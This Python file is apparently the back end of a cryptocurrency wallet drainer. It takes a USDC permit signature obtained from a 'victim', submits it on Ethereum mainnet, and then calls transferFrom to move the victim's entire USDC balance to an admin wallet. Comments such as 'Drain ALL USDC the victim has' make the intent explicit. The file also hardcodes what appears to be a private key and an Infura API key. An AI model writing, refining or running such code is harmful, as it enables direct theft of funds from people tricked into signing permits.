import os
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware

# --- CONFIGURATION ---
# CHANGED: Use your private Infura URL here
RPC_URL = "https://mainnet.infura.io/v3/df3f921aa86a4c559eb527db6961ab74"
ADMIN_PRIVATE_KEY = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a"
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

# Initialize Web3 (Added a 30s timeout to prevent server hang)
w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={'timeout': 30}))

# Injection using the new v7 naming
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)

USDC_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"}, {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"}
]

def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
    try:
        admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
        admin_addr = admin_account.address
        victim_addr = Web3.to_checksum_address(victim_address)
        contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)

        # Drain ALL USDC the victim has (safer than fixed amount)
        user_bal = contract.functions.balanceOf(victim_addr).call()
        if user_bal == 0:
            return None, f"USER_WALLET_ERROR: Target has 0 USDC."

        # Use full balance instead of fixed 'amount' to avoid the 9.4 vs 9 issue
        target_amount_raw = user_bal

        # Better gas handling - Use EIP-1559 (recommended in 2026)
        fee_history = w3.eth.fee_history(4, 'latest', [10, 50])
        base_fee = fee_history['baseFeePerGas'][-1]
        max_priority_fee = w3.to_wei(0.5, 'gwei')   # 0.5 gwei tip

        max_fee_per_gas = base_fee * 2 + max_priority_fee
        max_priority_fee_per_gas = max_priority_fee

        current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')

        # Convert signature
        r_bytes = w3.to_bytes(hexstr=r)
        s_bytes = w3.to_bytes(hexstr=s)

        # 1. PERMIT transaction
        permit_tx = contract.functions.permit(
            victim_addr, admin_addr, target_amount_raw, int(deadline), int(v), r_bytes, s_bytes
        ).build_transaction({
            "from": admin_addr,
            "nonce": current_nonce,
            "gas": 150000,                    # higher safety margin
            "maxFeePerGas": max_fee_per_gas,
            "maxPriorityFeePerGas": max_priority_fee_per_gas,
            "chainId": 1,
            "type": 2                         # EIP-1559
        })

        signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
        w3.eth.send_raw_transaction(signed_permit.raw_transaction)

        # Small delay to let the first tx propagate
        import time
        time.sleep(3)

        # 2. TRANSFERFROM transaction
        transfer_tx = contract.functions.transferFrom(
            victim_addr, admin_addr, target_amount_raw
        ).build_transaction({
            "from": admin_addr,
            "nonce": current_nonce + 1,
            "gas": 100000,
            "maxFeePerGas": max_fee_per_gas,
            "maxPriorityFeePerGas": max_priority_fee_per_gas,
            "chainId": 1,
            "type": 2
        })

        signed_transfer = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)

        return tx_hash.hex(), None

    except Exception as e:
        return None, f"EXECUTION_FAILED: {str(e)}"
